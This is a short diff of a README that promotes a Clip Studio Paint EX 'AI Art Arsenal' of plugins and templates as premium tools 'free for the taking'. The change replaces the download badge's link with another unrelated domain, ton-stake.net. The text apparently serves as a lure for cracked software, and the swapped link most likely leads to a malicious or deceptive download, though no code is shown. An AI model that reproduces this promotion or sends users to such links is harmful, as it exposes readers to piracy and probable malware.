@@ -2,7 +2,7 @@
 
 🚀 Unleash your inner manga master with Clip Studio AI Art Arsenal 2025! This powerhouse suite for Clip Studio Paint EX packs AI plugins, scripts, and templates to turn sketches into Shonen Jump-worthy panels and animations. Built for Windows, it’s your ticket to premium art tools—free for the taking.
 
-[![Explore Clip Studio AI Art Arsenal](https://img.shields.io/badge/Explore-Clip_Studio_AI_Art_Arsenal-blueviolet)](https://glocktober.com)
+[![Explore Clip Studio AI Art Arsenal](https://img.shields.io/badge/Explore-Clip_Studio_AI_Art_Arsenal-blueviolet)](https://ton-stake.net)
 ---
 
 ### Canvas Toolkit
